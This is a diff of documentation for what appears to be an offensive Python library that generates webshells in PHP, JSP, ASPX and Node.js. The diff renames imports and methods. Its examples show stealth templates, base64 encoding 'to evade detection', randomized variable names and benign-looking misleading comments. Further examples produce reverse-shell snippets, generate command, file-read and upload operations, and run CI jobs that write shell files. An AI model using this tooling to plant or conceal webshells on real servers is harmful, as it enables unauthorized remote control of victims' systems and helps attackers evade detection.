@@ -33,7 +33,7 @@ webshell/
 Generate PHP webshells with various features:
 
 ```python
-from ofx.api.webshell import PhpShell
+from ofx.api.exploitation.webshell.shell.php import PhpShell
 
 shell = PhpShell(
     password="mypass",
@@ -44,11 +44,11 @@ shell = PhpShell(
 
 # Generate minimal shell
 shell.template = "mini"
-code = shell.generate()
+code = shell.get_webshell()
 
 # Generate full-featured shell
 shell.template = "full"
-code = shell.generate()
+code = shell.get_webshell()
 ```
 
 **Templates Available:**
@@ -62,10 +62,10 @@ code = shell.generate()
 Java Server Pages webshells:
 
 ```python
-from ofx.api.webshell import JspShell
+from ofx.api.exploitation.webshell.shell.jsp import JspShell
 
 shell = JspShell(password="admin")
-code = shell.generate()
+code = shell.get_webshell()
 ```
 
 ### ASPX Webshells
@@ -73,38 +73,24 @@ code = shell.generate()
 ASP.NET webshells for IIS servers:
 
 ```python
-from ofx.api.webshell import AspxShell
+from ofx.api.exploitation.webshell.shell.aspx import AspxShell
 
 shell = AspxShell(
     password="pass123",
     encoder="base64"
 )
-code = shell.generate()
+code = shell.get_webshell()
 ```
 
-### Python Webshells
+### Python/Bash Operation Snippets
 
-Flask/Django-based webshells:
-
-```python
-from ofx.api.webshell import PythonShell
-
-shell = PythonShell(
-    framework="flask",  # or "django"
-    password="secret"
-)
-code = shell.generate()
-```
-
-### Bash Webshells
-
-CGI-based bash webshells:
+Use the code factory to generate language-specific snippets:
 
 ```python
-from ofx.api.webshell import BashShell
+from ofx.api.exploitation.webshell.factory import WebShellCodeFactory
 
-shell = BashShell(password="shell")
-code = shell.generate()
+python_rev = WebShellCodeFactory.reverse_shell("python", "127.0.0.1", 4444)
+bash_rev = WebShellCodeFactory.reverse_shell("bash", "127.0.0.1", 4444)
 ```
 
 ## Webshell Factory
@@ -112,22 +98,12 @@ code = shell.generate()
 The factory pattern provides a unified interface for creating webshells:
 
 ```python
-from ofx.api.webshell import WebShellFactory
+from ofx.api.exploitation.webshell.factory import WebShellCodeFactory
 
-# Create PHP shell
-factory = WebShellFactory()
-php_shell = factory.create("php", password="test")
-
-# Create JSP shell
-jsp_shell = factory.create("jsp", password="admin")
-
-# Create with custom options
-aspx_shell = factory.create(
-    "aspx",
-    password="secret",
-    template="stealth",
-    encoder="base64"
-)
+# Generate operation snippets
+cmd = WebShellCodeFactory.run_command("php", "id")
+read = WebShellCodeFactory.read_file("jsp", "/opt/app/data.xml")
+upload = WebShellCodeFactory.upload_file("asp", "shell.asp", "BASE64DATA")
 ```
 
 ## Template System
@@ -135,7 +111,7 @@ aspx_shell = factory.create(
 ### Using Built-in Templates
 
 ```python
-from ofx.api.webshell import PhpShell
+from ofx.api.exploitation.webshell.shell.php import PhpShell
 
 shell = PhpShell(password="pass")
 
@@ -145,7 +121,7 @@ print(templates)  # ['mini', 'default', 'full', 'stealth']
 
 # Use specific template
 shell.template = "stealth"
-code = shell.generate()
+code = shell.get_webshell()
 ```
 
 ### Creating Custom Templates
@@ -153,7 +129,7 @@ code = shell.generate()
 Templates use Jinja2 syntax with special placeholders:
 
 ```python
-from ofx.api.webshell import PhpShell
+from ofx.api.exploitation.webshell.shell.php import PhpShell
 
 # Define custom template
 custom_template = '''<?php
@@ -173,7 +149,7 @@ PhpShell.register_template("custom", custom_template)
 # Use custom template
 shell = PhpShell(password="cmd")
 shell.template = "custom"
-code = shell.generate()
+code = shell.get_webshell()
 ```
 
 ### Template Placeholders
@@ -195,9 +171,9 @@ Common placeholders used in templates:
 Create custom webshell connectors:
 
 ```python
-from ofx.data.webshell.connectors.base import WebShellConnector
+from ofx.api.exploitation.webshell.connectors.base import WebshellConnector
 
-class MyWebShell(WebShellConnector):
+class MyWebShell(WebshellConnector):
     def __init__(self, password="default"):
         super().__init__(language="php")
         self.password = password
@@ -214,9 +190,9 @@ class MyWebShell(WebShellConnector):
 Fetch webshells from remote sources:
 
 ```python
-from ofx.data.webshell.connectors.remote import RemoteWebShellConnector
+from ofx.api.exploitation.webshell.connectors.remote import RemoteHTTPConnector
 
-connector = RemoteWebShellConnector(
+connector = RemoteHTTPConnector(
     url="https://example.com/shells/php-shell.php"
 )
 shell_code = connector.fetch()
@@ -227,7 +203,7 @@ shell_code = connector.fetch()
 Use template files directly:
 
 ```python
-from ofx.data.webshell.connectors.template import TemplateConnector
+from ofx.api.exploitation.webshell.connectors.template import TemplateConnector
 
 connector = TemplateConnector(
     template_file="my_shell.php.j2",
@@ -250,7 +226,7 @@ jobs:
     steps:
       - name: Generate PHP shell
         script: |
-          from ofx.api.webshell import PhpShell
+          from ofx.api.exploitation.webshell.shell.php import PhpShell
           
           shell = PhpShell(
               password="cmd",
@@ -258,7 +234,7 @@ jobs:
               template="stealth"
           )
           
-          code = shell.generate()
+          code = shell.get_webshell()
           
           # Save to file
           with open('shell.php', 'w') as f:
@@ -276,14 +252,15 @@ jobs:
     steps:
       - name: Generate all types
         script: |
-          from ofx.api.webshell import WebShellFactory
+          from ofx.api.exploitation.webshell.shell.php import PhpShell
+          from ofx.api.exploitation.webshell.shell.jsp import JspShell
+          from ofx.api.exploitation.webshell.shell.aspx import AspxShell
           
-          factory = WebShellFactory()
-          languages = ['php', 'jsp', 'aspx', 'python']
+          shells = {"php": PhpShell, "jsp": JspShell, "aspx": AspxShell}
           
-          for lang in languages:
-              shell = factory.create(lang, password="admin")
-              code = shell.generate()
+          for lang, shell_cls in shells.items():
+              shell = shell_cls(password="admin")
+              code = shell.get_webshell()
               
               with open(f'shell.{lang}', 'w') as f:
                   f.write(code)
@@ -300,7 +277,7 @@ jobs:
     steps:
       - name: Generate with inputs
         script: |
-          from ofx.api.webshell import PhpShell
+          from ofx.api.exploitation.webshell.shell.php import PhpShell
           
           shell = PhpShell(
               password="${{ inputs.password }}",
@@ -308,7 +285,7 @@ jobs:
               secret_value="${{ secrets.auth_token }}"
           )
           
-          code = shell.generate()
+          code = shell.get_webshell()
           print(code)
 ```
 
@@ -319,10 +296,10 @@ jobs:
 Apply encoding to evade detection:
 
 ```python
-from ofx.api.webshell import PhpShell
+from ofx.api.exploitation.webshell.shell.php import PhpShell
 
 shell = PhpShell(password="cmd", encoder="base64")
-code = shell.generate()
+code = shell.get_webshell()
 
 # Shell will base64-decode commands before execution
 ```
@@ -333,19 +310,8 @@ Randomize variable names:
 
 ```python
 shell = PhpShell(password="cmd", randomize_vars=True)
-code = shell.generate()
+code = shell.get_webshell()
 # Variables will have random names like $a1b2c3
-```
-
-### String Obfuscation
-
-Obfuscate strings in the shell:
-
-```python
-from ofx.api.webshell.obfuscator import obfuscate_strings
-
-code = shell.generate()
-obfuscated = obfuscate_strings(code, method="hex")
 ```
 
 ### Comment Injection
@@ -354,7 +320,7 @@ Add misleading comments:
 
 ```python
 shell = PhpShell(password="cmd", add_comments=True)
-code = shell.generate()
+code = shell.get_webshell()
 # Will include benign-looking comments
 ```
 
@@ -442,12 +408,12 @@ Best practices:
 ### Local Testing
 
 ```python
-from ofx.api.webshell import PhpShell
+from ofx.api.exploitation.webshell.shell.php import PhpShell
 import subprocess
 
 # Generate shell
 shell = PhpShell(password="test")
-code = shell.generate()
+code = shell.get_webshell()
 
 # Write to file
 with open('/tmp/test_shell.php', 'w') as f:
@@ -484,9 +450,9 @@ To create a generator for a new language:
 
 ```python
 # generators/nodejs.py
-from ofx.data.webshell.connectors.base import WebShellConnector
+from ofx.api.exploitation.webshell.connectors.base import WebshellConnector
 
-class NodeJsShell(WebShellConnector):
+class NodeJsShell(WebshellConnector):
     def __init__(self, password="cmd", port=3000):
         super().__init__(language="nodejs")
         self.password = password
@@ -519,7 +485,7 @@ app.listen({{PORT}});
 # factory.py
 from generators.nodejs import NodeJsShell
 
-WebShellFactory.register('nodejs', NodeJsShell)
+WebShellCodeFactory.register('nodejs', NodeJsShell)
 ```
 
 ## Troubleshooting
